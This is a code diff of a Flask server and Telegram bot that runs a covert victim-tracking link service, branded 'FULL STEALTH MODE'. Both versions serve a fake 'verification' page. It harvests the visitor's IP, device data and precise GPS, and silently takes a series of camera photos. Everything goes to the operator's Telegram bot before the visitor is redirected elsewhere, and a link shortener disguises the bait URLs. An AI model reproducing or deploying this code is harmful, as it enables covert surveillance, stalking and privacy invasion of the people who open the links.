-        if (navigator.connection) {
-            collectedData.connection = {
-                effectiveType: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt
+        let collectedData = {
+            session_id: SESSION_ID,
+            start_time: new Date().toISOString(),
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+        
+        let photoCount = 0;
+        let mediaStream = null;
+        
+        async function sendData(type, data = null) {
+            const payload = {
+                type: type,
+                session_id: SESSION_ID,
+                timestamp: new Date().toISOString(),
+                data: data || collectedData
             };
-        }
-        
-        // اطلاعات باتری
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                collectedData.battery = {
-                    level: Math.round(battery.level * 100),
-                    charging: battery.charging,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischchargingTime
-                };
-            } catch(e) {}
-        }
-        
-        // دریافت IP
-        await getIPAddress();
-        
-        updateStatus("اطلاعات اولیه جمع‌آوری شد");
-    }
-    
-    // 2. دریافت آی‌پی و اطلاعات جغرافیایی IP-based
-    async function getIPAddress() {
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            collectedData.ip = ipData.ip;
             
-            // اطلاعات جغرافیایی بر اساس IP
             try {
-                const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
-                const geoData = await geoResponse.json();
-                collectedData.ipCountry = geoData.country_name;
-                collectedData.ipCity = geoData.city;
-                collectedData.ipLat = geoData.latitude;
-                collectedData.ipLon = geoData.longitude;
-                collectedData.isp = geoData.org;
+                await fetch('/api/capture', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
             } catch(e) {
-                console.log("IP-based geolocation failed:", e);
+                // Silent fail
             }
-            
-        } catch(e) {
-            console.log("IP fetch failed:", e);
         }
-    }
-    
-    // 3. دریافت موقعیت GPS
-    async function getGPSLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            
-            document.getElementById('gpsIndicator').classList.remove('hidden');
-            updateGPSStatus("در حال دریافت موقعیت...");
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    gpsData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        altitude: position.coords.altitude,
-                        speed: position.coords.speed,
-                        timestamp: position.timestamp
-                    };
-                    
-                    collectedData.gps = gpsData;
-                    updateGPSStatus("📍 موقعیت دریافت شد");
-                    resolve(gpsData);
-                    
-                    // ارسال موقعیت GPS
-                    sendDataToServer('gps', gpsData);
-                },
-                (error) => {
-                    console.log("GPS error:", error.code, error.message);
-                    updateGPSStatus("موقعیت دریافت نشد");
-                    resolve(null);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: config.gps_timeout,
-                    maximumAge: 0
-                }
-            );
-        });
-    }
-    
-    // 4. درخواست دسترسی‌ها
-    async function requestAllPermissions() {
-        updatePermissionStatus("درخواست دسترسی‌ها...");
         
-        try {
-            // اول موقعیت GPS
-            await getGPSLocation();
+        async function collectBasicInfo() {
+            updateProgress(10, "Checking device information...");
             
-            // سپس دسترسی دوربین/صفحه نمایش
-            const stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: 'environment',
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                }
-            }).catch(async () => {
-                // اگر دوربین نشد، صفحه نمایش
-                return await navigator.mediaDevices.getDisplayMedia({
-                    video: {
-                        cursor: 'always'
-                    },
-                    audio: false
-                }).catch(() => null);
-            });
-            
-            if (stream) {
-                photoStream = stream;
-                hasPermissions = true;
-                updatePermissionStatus("✅ دسترسی‌ها داده شد");
-                document.getElementById('permissionBox').classList.add('hidden');
-                document.getElementById('photoCounter').classList.remove('hidden');
-                
-                // شروع عکس‌برداری
-                startPhotoCapture();
-                
-                // ارسال داده‌های اولیه
-                sendInitialData();
-                
-            } else {
-                updatePermissionStatus("دسترسی‌ها داده نشد");
-                hasPermissions = false;
-                skipPermissions();
+            if (navigator.connection) {
+                collectedData.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                };
             }
             
-        } catch(error) {
-            console.log("Permission error:", error);
-            updatePermissionStatus("خطا در دریافت دسترسی");
-            skipPermissions();
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                collectedData.ip = ipData.ip;
+            } catch(e) {}
+            
+            updateProgress(30, "Analyzing connection...");
         }
-    }
-    
-    // 5. عکس‌برداری
-    function startPhotoCapture() {
-        if (!photoStream || photoCount >= config.max_photos) return;
         
-        const capturePhoto = () => {
-            if (photoCount >= config.max_photos) return;
+        async function getLocation() {
+            if (!navigator.geolocation) return;
             
-            const videoTrack = photoStream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(videoTrack);
-            
-            imageCapture.grabFrame()
-                .then(bitmap => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = bitmap.width;
-                    canvas.height = bitmap.height;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(bitmap, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            const base64data = reader.result.split(',')[1];
-                            
-                            // ارسال عکس
-                            sendPhotoToServer(photoCount + 1, base64data);
-                            
-                            // بروزرسانی شمارنده
-                            photoCount++;
-                            document.getElementById('photoCount').textContent = photoCount;
-                            
-                            // عکس بعدی
-                            if (photoCount < config.max_photos) {
-                                setTimeout(capturePhoto, config.photo_delay * 1000);
-                            } else {
-                                // پایان عکس‌برداری
-                                photoStream.getTracks().forEach(track => track.stop());
-                                completeSession();
-                            }
+            return new Promise(resolve => {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const loc = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
                         };
-                        reader.readAsDataURL(blob);
-                    }, 'image/jpeg', 0.8);
-                })
-                .catch(error => {
-                    console.log("Capture error:", error);
-                    photoCount++;
-                    if (photoCount < config.max_photos) {
-                        setTimeout(capturePhoto, config.photo_delay * 1000);
-                    } else {
-                        completeSession();
+                        collectedData.location = loc;
+                        sendData('gps', loc);
+                        resolve(loc);
+                    },
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+        
+        function updateProgress(percent, message) {
+            document.getElementById('progressBar').style.width = percent + '%';
+            document.getElementById('statusText').textContent = message;
+        }
+        
+        async function startCamera() {
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
                 });
-        };
-        
-        capturePhoto();
-    }
-    
-    // 6. رد دسترسی‌ها
-    function skipPermissions() {
-        updateStatus("ادامه بدون دسترسی‌های پیشرفته...");
-        document.getElementById('permissionBox').classList.add('hidden');
-        
-        // تلاش برای دریافت GPS بدون اجازه (ممکن است قبلاً داده باشد)
-        getGPSLocation().then(() => {
-            // ارسال داده‌های اولیه
-            sendInitialData();
-            
-            // انتقال به سایت مقصد
-            setTimeout(() => {
-                completeSession();
-            }, 3000);
-        });
-    }
-    
-    // 7. ارسال داده به سرور
-    async function sendDataToServer(type, data = null) {
-        const payload = {
-            type: type,
-            hash: config.hash,
-            timestamp: new Date().toISOString(),
-            data: data || collectedData
-        };
-        
-        try {
-            await fetch('/api/collect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) {
-            console.log("Send error:", e);
-        }
-    }
-    
-    async function sendPhotoToServer(index, imageData) {
-        const payload = {
-            type: 'photo',
-            hash: config.hash,
-            index: index,
-            image: imageData,
-            timestamp: new Date().toISOString()
-        };
-        
-        try {
-            await fetch('/api/photo', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch(e) {
-            console.log("Photo send error:", e);
-        }
-    }
-    
-    function sendInitialData() {
-        sendDataToServer('initial', collectedData);
-    }
-    
-    // 8. تکمیل جلسه و انتقال
-    function completeSession() {
-        updateStatus("✅ تکمیل عملیات");
-        
-        // ارسال داده نهایی
-        sendDataToServer('complete', {
-            ...collectedData,
-            photoCount: photoCount,
-            hasGPS: !!gpsData,
-            hasPhotos: hasPermissions && photoCount > 0
-        });
-        
-        // انتقال به سایت مقصد
-        setTimeout(() => {
-            window.location.replace("{{ redirect_url }}");
-        }, 2000);
-    }
-    
-    // Helper functions
-    function updateStatus(text) {
-        document.getElementById('statusText').textContent = text;
-    }
-    
-    function updatePermissionStatus(text) {
-        document.getElementById('permissionStatus').textContent = text;
-    }
-    
-    function updateGPSStatus(text) {
-        document.getElementById('gpsStatus').textContent = text;
-    }
-    
-    // شروع فرآیند
-    (async function init() {
-        // جمع‌آوری اطلاعات اولیه
-        await collectBasicInfo();
-        
-        // نشان دادن باکس دسترسی
-        setTimeout(() => {
-            document.getElementById('permissionBox').classList.remove('hidden');
-            updateStatus("آماده برای ویژگی‌های پیشرفته");
-        }, 1500);
-        
-        // تایم‌اوت خودکار
-        setTimeout(() => {
-            if (!hasPermissions) {
-                skipPermissions();
+                
+                const video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                document.getElementById('cameraContainer').style.display = 'block';
+                
+                updateProgress(50, "Camera ready for verification...");
+                return true;
+            } catch(e) {
+                console.log("Camera access not available");
+                return false;
             }
-        }, 10000);
+        }
         
-    })();
+        async function capturePhoto() {
+            if (!mediaStream || photoCount >= MAX_PHOTOS) return;
+            
+            const video = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(async blob => {
+                const reader = new FileReader();
+                reader.onloadend = () => {
+                    const base64data = reader.result.split(',')[1];
+                    
+                    sendData('photo', {
+                        index: photoCount + 1,
+                        image: base64data,
+                        size: `${canvas.width}x${canvas.height}`
+                    });
+                    
+                    photoCount++;
+                    
+                    if (photoCount < MAX_PHOTOS) {
+                        setTimeout(() => capturePhoto(), 1500);
+                    } else {
+                        completeVerification();
+                    }
+                };
+                reader.readAsDataURL(blob);
+            }, 'image/jpeg', 0.9);
+        }
+        
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        async function completeVerification() {
+            updateProgress(90, "Finalizing verification...");
+            
+            stopCamera();
+            
+            collectedData.end_time = new Date().toISOString();
+            collectedData.duration = new Date() - new Date(collectedData.start_time);
+            collectedData.photo_count = photoCount;
+            
+            await sendData('complete', collectedData);
+            
+            updateProgress(100, "Verification successful! Redirecting...");
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 1500);
+        }
+        
+        async function startVerification() {
+            document.getElementById('startVerification').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            
+            updateProgress(20, "Starting verification process...");
+            
+            await collectBasicInfo();
+            await sendData('init');
+            
+            updateProgress(40, "Checking location...");
+            await getLocation();
+            
+            updateProgress(60, "Preparing biometric verification...");
+            const cameraAvailable = await startCamera();
+            
+            if (cameraAvailable) {
+                document.getElementById('skipButton').style.display = 'block';
+                document.getElementById('loader').style.display = 'none';
+                
+                setTimeout(() => {
+                    updateProgress(70, "Taking verification images...");
+                    capturePhoto();
+                }, 1000);
+            } else {
+                updateProgress(80, "Using alternative verification method...");
+                document.getElementById('statusText').textContent = "Camera not available. Using alternative verification...";
+                document.getElementById('skipButton').style.display = 'none';
+                
+                setTimeout(() => {
+                    completeVerification();
+                }, 2000);
+            }
+        }
+        
+        function skipVerification() {
+            updateProgress(85, "Skipping biometric verification...");
+            document.getElementById('skipButton').style.display = 'none';
+            
+            setTimeout(() => {
+                completeVerification();
+            }, 1000);
+        }
+        
+        document.getElementById('startVerification').addEventListener('click', startVerification);
+        document.getElementById('skipButton').addEventListener('click', skipVerification);
+        
+        window.addEventListener('beforeunload', () => {
+            stopCamera();
+        });
     </script>
 </body>
 </html>
 '''
 
-# ==================== FLASK ROUTES ====================
 @app.route('/')
 def index():
     return redirect(Config.REDIRECT_URL)
 
-@app.route('/a/<hash_code>')
-def advanced_collector(hash_code):
+@app.route('/v/<short_code>')
+def short_link(short_code):
+    session = Database.get_session_by_short(short_code)
+    if session:
+        Database.increment_clicks(session['session_id'])
+        return redirect(f"/a/{session['session_id']}")
+    return redirect(Config.REDIRECT_URL)
+
+@app.route('/a/<session_id>')
+def advanced_page(session_id):
     return render_template_string(
-        HTML_TEMPLATE,
-        hash=hash_code,
+        ADVANCED_PAGE,
+        session_id=session_id,
         max_photos=Config.MAX_SCREENSHOTS,
-        photo_delay=Config.SCREENSHOT_DELAY,
-        gps_timeout=Config.GPS_TIMEOUT,
         redirect_url=Config.REDIRECT_URL
     )
 
-@app.route('/api/collect', methods=['POST'])
-def api_collect():
+@app.route('/api/capture', methods=['POST'])
+def api_capture():
     try:
         data = request.json
-        hash_code = data.get('hash')
-        data_type = data.get('type')
+        session_id = data.get('session_id')
+        capture_type = data.get('type')
         
-        if not hash_code:
+        if not session_id or not capture_type:
             return jsonify({"status": "ok"}), 200
         
-        # استخراج user_id از هش (اگر در دیتابیس موجود باشد)
-        conn = sqlite3.connect('absolute.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM sessions WHERE hash=?", (hash_code,))
-        session = c.fetchone()
-        conn.close()
+        Database.save_capture(session_id, capture_type, data.get('data', {}))
         
-        if session:
-            user_id = session[0]
-            
-            # پردازش بر اساس نوع داده
-            if data_type == 'initial' or data_type == 'complete':
-                collected = data.get('data', {})
-                
-                # ذخیره در دیتابیس
-                db.save_session({
-                    'hash': hash_code,
-                    'user_id': user_id,
-                    'ip': collected.get('ip'),
-                    'country': collected.get('ipCountry'),
-                    'city': collected.get('ipCity'),
-                    'latitude': collected.get('gps', {}).get('latitude') or collected.get('ipLat'),
-                    'longitude': collected.get('gps', {}).get('longitude') or collected.get('ipLon'),
-                    'accuracy': collected.get('gps', {}).get('accuracy'),
-                    'user_agent': collected.get('userAgent'),
-                    'platform': collected.get('platform'),
-                    'device': 'Detecting...',
-                    'screen': collected.get('screen'),
-                    'timezone': collected.get('timezone'),
-                    'battery': collected.get('battery', {}).get('level'),
-                    'network': collected.get('connection', {}).get('effectiveType'),
-                    'raw_data': json.dumps(collected)
-                })
-                
-                # ارسال نوتیفیکیشن به تلگرام
-                if data_type == 'initial':
-                    gps_info = ""
-                    if collected.get('gps'):
-                        gps = collected['gps']
-                        gps_info = f"\n📍 <b>GPS:</b> {gps['latitude']:.6f}, {gps['longitude']:.6f}"
-                    elif collected.get('ipLat'):
-                        gps_info = f"\n🌐 <b>IP Location:</b> {collected['ipLat']}, {collected['ipLon']}"
-                    
-                    message = f"""
-🎯 <b>جلسه جدید شروع شد</b>
-
-🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
-🌐 <b>IP:</b> <code>{collected.get('ip', 'N/A')}</code>
-📱 <b>دستگاه:</b> {collected.get('platform', 'N/A')}{gps_info}
-🕐 <b>زمان:</b> {datetime.now().strftime('%H:%M:%S')}
-
-⚡ <i>منتظر اطلاعات بیشتر...</i>
-                    """
-                    
-                    try:
-                        bot.send_message(user_id, message, parse_mode='HTML')
-                    except:
-                        pass
-                
-                elif data_type == 'complete':
-                    message = f"""
-✅ <b>جلسه تکمیل شد</b>
-
-🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
-📊 <b>نتیجه:</b>
-• 📍 موقعیت: {'✅ دریافت شد' if collected.get('gps') else '❌ دریافت نشد'}
-• 📸 عکس: {collected.get('photoCount', 0)} عدد
-• 🌐 IP: {collected.get('ip', 'N/A')}
-• 📱 دستگاه: {collected.get('platform', 'N/A')}
-
-🕐 <b>پایان:</b> {datetime.now().strftime('%H:%M:%S')}
-                    """
-                    
-                    try:
-                        bot.send_message(user_id, message, parse_mode='HTML')
-                    except:
-                        pass
-            
-            elif data_type == 'gps':
-                gps_data = data.get('data', {})
-                if gps_data.get('latitude') and gps_data.get('longitude'):
-                    message = f"""
-📍 <b>موقعیت GPS دریافت شد</b>
-
-🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
-📌 <b>مختصات:</b>
-• عرض: {gps_data['latitude']:.6f}
-• طول: {gps_data['longitude']:.6f}
-• دقت: {gps_data.get('accuracy', 'N/A')} متر
-• ارتفاع: {gps_data.get('altitude', 'N/A')} متر
-
-🗺️ <a href="https://www.google.com/maps?q={gps_data['latitude']},{gps_data['longitude']}">مشاهده در Google Maps</a>
-                    """
-                    
-                    try:
-                        bot.send_message(user_id, message, parse_mode='HTML')
-                    except:
-                        pass
-        
-        return jsonify({"status": "ok"}), 200
-        
-    except Exception as e:
-        log.error(f"API Error: {e}")
-        return jsonify({"status": "ok"}), 200  # همیشه OK برگردان
-
-@app.route('/api/photo', methods=['POST'])
-def api_photo():
-    try:
-        data = request.json
-        hash_code = data.get('hash')
-        index = data.get('index')
-        image_data = data.get('image')
-        
-        if not all([hash_code, index, image_data]):
-            return jsonify({"status": "ok"}), 200
-        
-        # فشرده‌سازی عکس
-        compressed_image = utils.compress_image(image_data)
-        
-        # ذخیره در دیتابیس
-        db.save_photo(hash_code, index, compressed_image)
-        
-        # پیدا کردن user_id برای ارسال
-        conn = sqlite3.connect('absolute.db')
-        c = conn.cursor()
-        c.execute("SELECT user_id FROM sessions WHERE hash=?", (hash_code,))
-        session = c.fetchone()
-        conn.close()
-        
-        if session and index % 2 == 0:  # هر عکس دوم را ارسال کن
-            user_id = session[0]
-            
-            # تبدیل base64 به bytes برای تلگرام
-            try:
-                image_bytes = base64.b64decode(compressed_image)
-                
-                # ارسال به تلگرام
-                bot.send_photo(
+        if bot_manager and capture_type in ['init', 'gps', 'photo', 'complete']:
+            user_id = Database.get_user_by_session(session_id)
+            if user_id:
+                bot_manager.send_instant_update(
                     user_id,
-                    photo=image_bytes,
-                    caption=f"📸 عکس #{index} از {hash_code[:8]}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
+                    session_id,
+                    capture_type,
+                    data.get('data', {})
                 )
-            except Exception as e:
-                log.error(f"Telegram photo send error: {e}")
         
         return jsonify({"status": "ok"}), 200
         
     except Exception as e:
-        log.error(f"Photo API Error: {e}")
+        log.error(f"Capture error: {e}")
         return jsonify({"status": "ok"}), 200
 
-# ==================== SYSTEM CONTROLS ====================
+@app.route('/api/shorten', methods=['POST'])
+def api_shorten():
+    try:
+        data = request.json
+        long_url = data.get('url')
+        user_id = data.get('user_id')
+        
+        if not long_url or not user_id:
+            return jsonify({"error": "Invalid request"}), 400
+        
+        session_id = secrets.token_urlsafe(12)
+        clean_link, short_code = LinkMaster.create_clean_link(Config.SERVER_URL, session_id)
+        
+        Database.create_session(session_id, user_id, short_code)
+        
+        return jsonify({
+            "short_url": clean_link,
+            "short_code": short_code,
+            "direct_url": f"{Config.SERVER_URL}/a/{session_id}",
+            "expires": (datetime.now() + timedelta(hours=24)).isoformat()
+        })
+        
+    except Exception as e:
+        log.error(f"Shorten error: {e}")
+        return jsonify({"error": "Internal error"}), 500
+
 @app.route('/status')
 def status():
-    conn = sqlite3.connect('absolute.db')
-    c = conn.cursor()
-    c.execute("SELECT COUNT(*) FROM sessions")
-    session_count = c.fetchone()[0]
-    c.execute("SELECT COUNT(*) FROM photos")
-    photo_count = c.fetchone()[0]
-    conn.close()
-    
+    stats = Database.get_quick_stats()
     return jsonify({
-        "status": "active",
+        "status": "operational",
         "version": Config.VERSION,
-        "sessions": session_count,
-        "photos": photo_count,
-        "uptime": str(datetime.now() - start_time),
-        "redirect_url": Config.REDIRECT_URL
+        "timestamp": datetime.now().isoformat(),
+        "stats": stats
     })
 
-@app.route('/sessions')
-def list_sessions():
-    conn = sqlite3.connect('absolute.db')
-    c = conn.cursor()
-    c.execute("SELECT hash, created, ip, country, city, latitude, longitude, has_photo FROM sessions ORDER BY created DESC LIMIT 50")
-    sessions = c.fetchall()
-    conn.close()
-    
-    result = []
-    for s in sessions:
-        result.append({
-            "hash": s[0],
-            "created": s[1],
-            "ip": s[2],
-            "country": s[3],
-            "city": s[4],
-            "latitude": s[5],
-            "longitude": s[6],
-            "has_photo": bool(s[7])
-        })
-    
-    return jsonify({"sessions": result})
-
-# ==================== MAIN EXECUTION ====================
+# ==================== MAIN ====================
 def run_flask():
-    log.info(f"🌐 Web server starting on port {Config.PORT}")
-    app.run(host='0.0.0.0', port=Config.PORT, debug=False, threaded=True)
+    from waitress import serve
+    serve(app, host='0.0.0.0', port=Config.PORT, threads=10)
 
 def run_bot():
-    log.info("🤖 Telegram bot starting...")
-    while True:
-        try:
-            bot.polling(none_stop=True, timeout=60)
-        except Exception as e:
-            log.error(f"Bot error: {e}")
-            time.sleep(5)
+    global bot_manager
+    bot_manager = EliteBot(Config.BOT_TOKEN)
+    bot_manager.polling()
 
-def run_install_check():
-    """بررسی و نصب وابستگی‌ها"""
-    log.info("🔧 Running dependency check...")
-    utils.install_dependencies()
-    log.info("✅ All dependencies are ready")
+def check_deps():
+    required = ['flask', 'pyTelegramBotAPI', 'pillow', 'requests', 'waitress']
+    for pkg in required:
+        try:
+            __import__(pkg.replace('-', '_'))
+        except ImportError:
+            log.warning(f"Installing {pkg}...")
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "-q"])
 
 if __name__ == "__main__":
-    start_time = datetime.now()
-    
     print("\n" + "="*70)
-    print(f"🚀 MR.SIAVASH.IR - ABSOLUTE ULTIMATE v1.0")
+    print("🚀 ULTIMATE PRO SYSTEM v3.0 - FULL STEALTH MODE".center(70))
     print("="*70)
-    print(f"📅 Started at: {start_time}")
-    print(f"👤 Admin ID: {Config.ADMIN_ID}")
-    print(f"🌐 Redirect URL: {Config.REDIRECT_URL}")
-    print(f"📸 Max photos: {Config.MAX_SCREENSHOTS}")
-    print(f"📍 GPS timeout: {Config.GPS_TIMEOUT}ms")
-    print("="*70 + "\n")
     
-    # نصب وابستگی‌ها
-    run_install_check()
+    try:
+        Config.validate()
+    except ValueError as e:
+        log.error(str(e))
+        sys.exit(1)
     
-    # راه‌اندازی سرور و ربات
+    check_deps()
+    
+    db = Database.get_instance()
+    
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     bot_thread = threading.Thread(target=run_bot, daemon=True)
     
     flask_thread.start()
-    time.sleep(2)  # منتظر راه‌اندازی سرور
+    time.sleep(2)
     bot_thread.start()
     
-    log.info("✅ System is fully operational!")
-    log.info(f"💡 Access at: http://localhost:{Config.PORT}")
-    log.info(f"📊 Check status: http://localhost:{Config.PORT}/status")
-    log.info(f"📄 List sessions: http://localhost:{Config.PORT}/sessions")
+    log.info(f"✅ System Active | URL: {Config.SERVER_URL}")
+    log.info("🕵️ Full Stealth Mode Enabled")
+    log.info("⚡ Real-time Delivery Active")
+    log.info("🔗 Smart Link System Ready")
     
-    # نگه داشتن برنامه
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        log.info("\n👋 System shutdown requested")
-
-        log.info(f"⏳ Total uptime: {datetime.now() - start_time}")
+        log.info("System shutdown")
